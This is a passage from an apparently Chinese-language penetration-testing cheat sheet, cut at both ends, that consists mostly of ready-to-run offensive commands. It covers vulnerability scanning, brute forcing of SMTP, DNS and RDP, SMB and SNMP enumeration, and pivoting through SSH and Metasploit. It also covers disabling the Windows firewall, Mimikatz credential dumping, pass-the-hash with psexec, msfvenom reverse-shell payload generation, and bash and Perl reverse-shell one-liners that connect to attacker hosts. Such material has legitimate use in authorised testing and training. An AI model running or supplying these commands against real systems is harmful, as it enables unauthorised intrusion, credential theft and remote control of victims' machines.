class="line">8</div></pre></div><div class="code"><pre><div class="line">cd /usr/share/nmap/scripts/</div><div class="line">wget http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz</div><div class="line">nmap -sS -sV --script=vulscan/vulscan.nse target</div><div class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target</div><div class="line">nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target</div><div class="line">nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target</div><div class="line">nmap -sV --script=vuln target</div><div class="line">nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target</div></pre></div></div></figure><h2 id="使用-DIRB-爆破目录"><a href="#使用-DIRB-爆破目录" class="headerlink" title="使用 DIRB 爆破目录"></a>使用 DIRB 爆破目录</h2><p><code>DIRB 是一个专门用于爆破目录的工具，在 Kali 中默认已经安装</code></p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt</div></pre></div></div></figure><h2 id="Patator-–-全能暴力破解测试工具"><a href="#Patator-–-全能暴力破解测试工具" class="headerlink" title="Patator – 全能暴力破解测试工具"></a>Patator – 全能暴力破解测试工具</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"># git clone https://github.com/lanjelot/patator.git /usr/share/patator</div><div class="line"></div><div class="line"># SMTP 爆破</div><div class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst</div><div class="line">$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</div><div class="line">$ patator smtp_login host=192.168.17.129 helo=&apos;ehlo 192.168.17.128&apos; user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</div><div class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=&apos;incorrect password or account name&apos;</div></pre></div></div></figure><h2 id="使用-Fierce-爆破-DNS"><a href="#使用-Fierce-爆破-DNS" class="headerlink" title="使用 Fierce 爆破 DNS"></a>使用 Fierce 爆破 DNS</h2><blockquote><p>注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：subDomainsBrute 和 SubBrute 等等</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"># http://ha.ckers.org/fierce/</div><div class="line">$ ./fierce.pl -dns example.com</div><div class="line">$ ./fierce.pl –dns example.com –wordlist myWordList.txt</div></pre></div></div></figure><h2 id="使用-Nikto-扫描-Web-服务"><a href="#使用-Nikto-扫描-Web-服务" class="headerlink" title="使用 Nikto 扫描 Web 服务"></a>使用 Nikto 扫描 Web 服务</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">nikto -C all -h http://IP</div></pre></div></div></figure><h2 id="扫描-WordPress"><a href="#扫描-WordPress" class="headerlink" title="扫描 WordPress"></a>扫描 WordPress</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">git clone https://github.com/wpscanteam/wpscan.git &amp;&amp; cd wpscan</div><div class="line">./wpscan –url http://IP/ –enumerate p</div></pre></div></div></figure><h2 id="HTTP-指纹识别"><a href="#HTTP-指纹识别" class="headerlink" title="HTTP 指纹识别"></a>HTTP 指纹识别</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip</div><div class="line">cd httprint_301/linux/</div><div class="line">./httprint -h http://IP -s signatures.txt</div><div class="line">使用 Skipfish 扫描</div><div class="line">注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。</div></pre></div></div></figure><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP</div></pre></div></div></figure><h2 id="使用-NC-扫描"><a href="#使用-NC-扫描" class="headerlink" title="使用 NC 扫描"></a>使用 NC 扫描</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">nc -v -w 1 target -z 1-1000</div><div class="line">for i in &#123;101..102&#125;; do nc -vv -n -w 1 192.168.56.$i 21-25 -z; done</div><div class="line"></div><div class="line">#判断端口是否开启</div><div class="line">nc -v5 -w target port</div></pre></div></div></figure><h2 id="Unicornscan"><a href="#Unicornscan" class="headerlink" title="Unicornscan"></a>Unicornscan</h2><blockquote><p>注：Unicornscan 是一个信息收集和安全审计的工具。</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">us -H -msf -Iv 192.168.56.101 -p 1-65535</div><div class="line">us -H -mU -Iv 192.168.56.101 -p 1-65535</div><div class="line"></div><div class="line">-H 在生成报告阶段解析主机名</div><div class="line">-m 扫描类型 (sf - tcp, U - udp)</div><div class="line">-Iv - 详细</div></pre></div></div></figure><h2 id="使用-Xprobe2-识别操作系统指纹"><a href="#使用-Xprobe2-识别操作系统指纹" class="headerlink" title="使用 Xprobe2 识别操作系统指纹"></a>使用 Xprobe2 识别操作系统指纹</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">xprobe2 -v -p tcp:80:open IP</div></pre></div></div></figure><h2 id="枚举-Samba"><a href="#枚举-Samba" class="headerlink" title="枚举 Samba"></a>枚举 Samba</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">nmblookup -A target</div><div class="line">smbclient //MOUNT/share -I target -N</div><div class="line">rpcclient -U &quot;&quot; target</div><div class="line">enum4linux target</div></pre></div></div></figure><h2 id="枚举-SNMP"><a href="#枚举-SNMP" class="headerlink" title="枚举 SNMP"></a>枚举 SNMP</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">snmpget -v 1 -c public IP</div><div class="line">snmpwalk -v 1 -c public IP</div><div class="line">snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP</div></pre></div></div></figure><h2 id="PuTTY-连接隧道"><a href="#PuTTY-连接隧道" class="headerlink" title="PuTTY 连接隧道"></a>PuTTY 连接隧道</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">转发远程端口到目标地址</div><div class="line">plink.exe -P 22 -l root -pw &quot;1234&quot; -R 445:127.0.0.1:445 IP</div></pre></div></div></figure><h2 id="Meterpreter-端口转发"><a href="#Meterpreter-端口转发" class="headerlink" title="Meterpreter 端口转发"></a>Meterpreter 端口转发</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"># 转发远程端口到目标地址</div><div class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141</div><div class="line">kali &gt; rdesktop 127.0.0.1:3389</div></pre></div></div></figure><h2 id="SSH-穿透"><a href="#SSH-穿透" class="headerlink" title="SSH 穿透"></a>SSH 穿透</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">ssh -D 127.0.0.1:1080 -p 22 user@IP</div><div class="line">Add socks4 127.0.0.1 1080 in /etc/proxychains.conf</div><div class="line">proxychains commands target</div></pre></div></div></figure><h2 id="SSH-穿透从一个网络到另一个网络"><a href="#SSH-穿透从一个网络到另一个网络" class="headerlink" title="SSH 穿透从一个网络到另一个网络"></a>SSH 穿透从一个网络到另一个网络</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">ssh -D 127.0.0.1:1080 -p 22 user1@IP1</div><div class="line">Add socks4 127.0.0.1 1080 in /etc/proxychains.conf</div><div class="line">proxychains ssh -D 127.0.0.1:1081 -p 22 user1@IP2</div><div class="line">Add socks4 127.0.0.1 1081 in /etc/proxychains.conf</div><div class="line">proxychains commands target</div></pre></div></div></figure><h2 id="使用-metasploit-进行穿透"><a href="#使用-metasploit-进行穿透" class="headerlink" title="使用 metasploit 进行穿透"></a>使用 metasploit 进行穿透</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></div><div class="code"><pre><div class="line">route add X.X.X.X 255.255.255.0 1</div><div class="line">use auxiliary/server/socks4a</div><div class="line">run</div><div class="line">proxychains msfcli windows/* PAYLOAD=windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 RHOST=IP E</div><div class="line"></div><div class="line">或者</div><div class="line"></div><div class="line">meterpreter &gt; ipconfig</div><div class="line">IP Address  : 10.1.13.3</div><div class="line">meterpreter &gt; run autoroute -s 10.1.13.0/24</div><div class="line">meterpreter &gt; run autoroute -p</div><div class="line">10.1.13.0          255.255.255.0      Session 1</div><div class="line">meterpreter &gt; Ctrl+Z</div><div class="line">msf auxiliary(tcp) &gt; use exploit/windows/smb/psexec</div><div class="line">msf exploit(psexec) &gt; set RHOST 10.1.13.2</div><div class="line">msf exploit(psexec) &gt; exploit</div><div class="line">meterpreter &gt; ipconfig</div><div class="line">IP Address  : 10.1.13.2</div></pre></div></div></figure><h2 id="开启-RDP-服务"><a href="#开启-RDP-服务" class="headerlink" title="开启 RDP 服务"></a>开启 RDP 服务</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">reg add &quot;hklm\system\currentcontrolset\control\terminal server&quot; /f /v fDenyTSConnections /t REG_DWORD /d 0</div><div class="line">netsh firewall set service remoteadmin enable</div><div class="line">netsh firewall set service remotedesktop enable</div></pre></div></div></figure><h2 id="关闭-Windows-防火墙"><a href="#关闭-Windows-防火墙" class="headerlink" title="关闭 Windows 防火墙"></a>关闭 Windows 防火墙</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">netsh firewall set opmode disable</div></pre></div></div></figure><h2 id="Meterpreter-VNC-RDP"><a href="#Meterpreter-VNC-RDP" class="headerlink" title="Meterpreter VNC\RDP"></a>Meterpreter VNC\RDP</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">run getgui -u admin -p 1234</div><div class="line">run vnc -p 5043</div></pre></div></div></figure><h2 id="使用-Mimikatz获取-Windows-明文用户名密码"><a href="#使用-Mimikatz获取-Windows-明文用户名密码" class="headerlink" title="使用 Mimikatz获取 Windows 明文用户名密码"></a>使用 Mimikatz获取 Windows 明文用户名密码</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></div><div class="code"><pre><div class="line">git clone https://github.com/gentilkiwi/mimikatz.git</div><div class="line">privilege::debug</div><div class="line">sekurlsa::logonPasswords full</div><div class="line">获取哈希值</div><div class="line"></div><div class="line">git clone https://github.com/byt3bl33d3r/pth-toolkit</div><div class="line">pth-winexe -U hash //IP cmd</div><div class="line"></div><div class="line">或者</div><div class="line"></div><div class="line">apt-get install freerdp-x11</div><div class="line">xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP</div><div class="line"></div><div class="line">在或者</div><div class="line"></div><div class="line">meterpreter &gt; run post/windows/gather/hashdump</div><div class="line">Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::</div><div class="line">msf &gt; use exploit/windows/smb/psexec</div><div class="line">msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp</div><div class="line">msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c</div><div class="line">msf exploit(psexec) &gt; exploit</div><div class="line">meterpreter &gt; shell</div></pre></div></div></figure><h2 id="使用-Hashcat-破解密码"><a href="#使用-Hashcat-破解密码" class="headerlink" title="使用 Hashcat 破解密码"></a>使用 Hashcat 破解密码</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">hashcat -m 400 -a 0 hash /root/rockyou.txt</div></pre></div></div></figure><h2 id="使用-NC-抓取-Banner-信息"><a href="#使用-NC-抓取-Banner-信息" class="headerlink" title="使用 NC 抓取 Banner 信息"></a>使用 NC 抓取 Banner 信息</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">nc 192.168.0.10 80</div><div class="line">GET / HTTP/1.1</div><div class="line">Host: 192.168.0.10</div><div class="line">User-Agent: Mozilla/4.0</div><div class="line">Referrer: www.example.com</div></pre></div></div></figure><h2 id="查找-SUID-SGID-root-文件"><a href="#查找-SUID-SGID-root-文件" class="headerlink" title="查找 SUID\SGID root 文件"></a>查找 SUID\SGID root 文件</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line"># 查找 SUID root 文件</div><div class="line">find / -user root -perm -4000 -print</div><div class="line"></div><div class="line"># 查找 SGID root 文件:</div><div class="line">find / -group root -perm -2000 -print</div><div class="line"></div><div class="line"># 查找 SUID 和 SGID 文件:</div><div class="line">find / -perm -4000 -o -perm -2000 -print</div><div class="line"></div><div class="line"># 查找不属于任何用户的文件:</div><div class="line">find / -nouser -print</div><div class="line"></div><div class="line"># 查找不属于任何用户组的文件:</div><div class="line">find / -nogroup -print</div><div class="line"></div><div class="line"># 查找软连接及其指向:</div><div class="line">find / -type l -ls</div></pre></div></div></figure><h2 id="获取进程对应的-PID"><a href="#获取进程对应的-PID" class="headerlink" title="获取进程对应的 PID"></a>获取进程对应的 PID</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">fuser -nv tcp 80</div><div class="line">fuser -k -n tcp 80</div></pre></div></div></figure><h2 id="使用-Hydra-爆破-RDP"><a href="#使用-Hydra-爆破-RDP" class="headerlink" title="使用 Hydra 爆破 RDP"></a>使用 Hydra 爆破 RDP</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">hydra -l admin -P /root/Desktop/passwords -S X.X.X.X rdp</div></pre></div></div></figure><h2 id="挂载远程-Windows-共享文件夹"><a href="#挂载远程-Windows-共享文件夹" class="headerlink" title="挂载远程 Windows 共享文件夹"></a>挂载远程 Windows 共享文件夹</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw</div></pre></div></div></figure><h2 id="Kali-下编译-Exploit"><a href="#Kali-下编译-Exploit" class="headerlink" title="Kali 下编译 Exploit"></a>Kali 下编译 Exploit</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">gcc -m32 -o output32 hello.c (32 位)</div><div class="line">gcc -m64 -o output hello.c (64 位)</div></pre></div></div></figure><h2 id="Kali-下编译-Windows-Exploit"><a href="#Kali-下编译-Windows-Exploit" class="headerlink" title="Kali 下编译 Windows Exploit"></a>Kali 下编译 Windows Exploit</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</div><div class="line">wine mingw-get-setup.exe</div><div class="line">select mingw32-base</div><div class="line">cd /root/.wine/drive_c/windows</div><div class="line">wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</div><div class="line">cd /root/.wine/drive_c/MinGW/bin</div><div class="line">wine gcc -o ability.exe /tmp/exploit.c -lwsock32</div><div class="line">wine ability.exe</div></pre></div></div></figure><h2 id="NASM-命令"><a href="#NASM-命令" class="headerlink" title="NASM 命令"></a>NASM 命令</h2><blockquote><p>NASM 全称 The Netwide Assembler，是一款基于80×86和x86-64平台的汇编语言编译程序，其设计初衷是为了实现编译器程序跨平台和模块化的特性。</p></blockquote><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">nasm -f bin -o payload.bin payload.asm</div><div class="line">nasm -f elf payload.asm; ld -o payload payload.o; objdump -d payload</div></pre></div></div></figure><h2 id="基于-CSV-文件查询-Exploit-DB"><a href="#基于-CSV-文件查询-Exploit-DB" class="headerlink" title="基于 CSV 文件查询 Exploit-DB"></a>基于 CSV 文件查询 Exploit-DB</h2><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line">git clone https://github.com/offensive-security/exploit-database.git</div><div class="line">cd exploit-database</div><div class="line">./searchsploit –u</div><div class="line">./searchsploit apache 2.2</div><div class="line">./searchsploit &quot;Linux Kernel&quot;</div><div class="line"></div><div class="line">cat files.csv | grep -i linux | grep -i kernel | grep -i local | grep -v dos | uniq | grep 2.6 | egrep &quot;&lt;|&lt;=&quot; | sort -k3</div></pre></div></div></figure><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><h3 id="使用-NC-在-Windows-上反弹-shell"><a href="#使用-NC-在-Windows-上反弹-shell" class="headerlink" title="使用 NC 在 Windows 上反弹 shell"></a>使用 NC 在 Windows 上反弹 shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">c:&gt;nc -Lp 31337 -vv -e cmd.exe</div><div class="line">nc 192.168.0.10 31337</div><div class="line">c:&gt;nc example.com 80 -e cmd.exe</div><div class="line">nc -lp 80</div><div class="line"></div><div class="line">nc -lp 31337 -e /bin/bash</div><div class="line">nc 192.168.0.10 31337</div><div class="line">nc -vv -r(random) -w(wait) 1 192.168.0.10 -z(i/o error) 1-1000</div></pre></div></div></figure><h3 id="Python-shell"><a href="#Python-shell" class="headerlink" title="Python shell"></a>Python shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</div></pre></div></div></figure><h3 id="Python-Ruby-PHP-HTTP-服务器"><a href="#Python-Ruby-PHP-HTTP-服务器" class="headerlink" title="Python\Ruby\PHP HTTP 服务器"></a>Python\Ruby\PHP HTTP 服务器</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">python2 -m SimpleHTTPServer</div><div class="line">python3 -m http.server</div><div class="line"></div><div class="line">ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 8888, :D</div><div class="line"> ocumentRoot =&gt; Dir.pwd).start&quot;</div><div class="line">php -S 0.0.0.0:8888</div></pre></div></div></figure><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; X &gt; system.exe</div><div class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 R &gt; exploit.php</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -a x86 --platform win -f asp -o file.asp</div><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e x86/shikata_ga_nai -b &quot;\x00&quot; -a x86 --platform win -f c</div></pre></div></div></figure><h3 id="MSF-生成在-Linux-下反弹的-Meterpreter-Shell"><a href="#MSF-生成在-Linux-下反弹的-Meterpreter-Shell" class="headerlink" title="MSF 生成在 Linux 下反弹的 Meterpreter Shell"></a>MSF 生成在 Linux 下反弹的 Meterpreter Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=443 -e -f elf -a x86 --platform linux -o shell</div></pre></div></div></figure><h3 id="MSF-生成反弹-Shell-C-Shellcode"><a href="#MSF-生成反弹-Shell-C-Shellcode" class="headerlink" title="MSF 生成反弹 Shell (C Shellcode)"></a>MSF 生成反弹 Shell (C Shellcode)</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">msfvenom -p windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c</div></pre></div></div></figure><h3 id="MSF-生成反弹-Python-Shell"><a href="#MSF-生成反弹-Python-Shell" class="headerlink" title="MSF 生成反弹 Python Shell"></a>MSF 生成反弹 Python Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=127.0.0.1 LPORT=443 -o shell.py</div></pre></div></div></figure><h3 id="MSF-生成反弹-ASP-Shell"><a href="#MSF-生成反弹-ASP-Shell" class="headerlink" title="MSF 生成反弹 ASP Shell"></a>MSF 生成反弹 ASP Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp</div></pre></div></div></figure><h3 id="MSF-生成反弹-Bash-Shell"><a href="#MSF-生成反弹-Bash-Shell" class="headerlink" title="MSF 生成反弹 Bash Shell"></a>MSF 生成反弹 Bash Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh</div></pre></div></div></figure><h3 id="MSF-生成反弹-PHP-Shell"><a href="#MSF-生成反弹-PHP-Shell" class="headerlink" title="MSF 生成反弹 PHP Shell"></a>MSF 生成反弹 PHP Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.php</div><div class="line">add &lt;?php at the beginning</div><div class="line">perl -i~ -0777pe&apos;s/^/&lt;?php \n/&apos; shell.php</div></pre></div></div></figure><h3 id="MSF-生成反弹-Win-Shell"><a href="#MSF-生成反弹-Win-Shell" class="headerlink" title="MSF 生成反弹 Win Shell"></a>MSF 生成反弹 Win Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe</div></pre></div></div></figure><h3 id="BASH-反弹-Shell"><a href="#BASH-反弹-Shell" class="headerlink" title="BASH 反弹 Shell"></a>BASH 反弹 Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line">bash -i &gt;&amp; /dev/tcp/X.X.X.X/443 0&gt;&amp;1</div><div class="line"></div><div class="line">exec /bin/bash 0&amp;0 2&gt;&amp;0</div><div class="line">exec /bin/bash 0&amp;0 2&gt;&amp;0</div><div class="line"></div><div class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</div><div class="line"></div><div class="line">0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</div><div class="line"></div><div class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</div><div class="line">exec 5&lt;&gt;/dev/tcp/attackerip/4444</div><div class="line"></div><div class="line">cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done # or:</div><div class="line">while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</div><div class="line"></div><div class="line">/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;&amp;1 2&gt;&amp;1</div><div class="line">/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;&amp;1 2&gt;&amp;1</div></pre></div></div></figure><h3 id="PERL-反弹-Shell"><a href="#PERL-反弹-Shell" class="headerlink" title="PERL 反弹 Shell"></a>PERL 反弹 Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div><div class="line"></div><div class="line"># Win 平台</div><div class="line">perl -MIO -e &apos;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</div><div class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;’</div></pre></div></div></figure><h3 id="RUBY-反弹-Shell"><a href="#RUBY-反弹-Shell" class="headerlink" title="RUBY 反弹 Shell"></a>RUBY 反弹 Shell</h3><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div 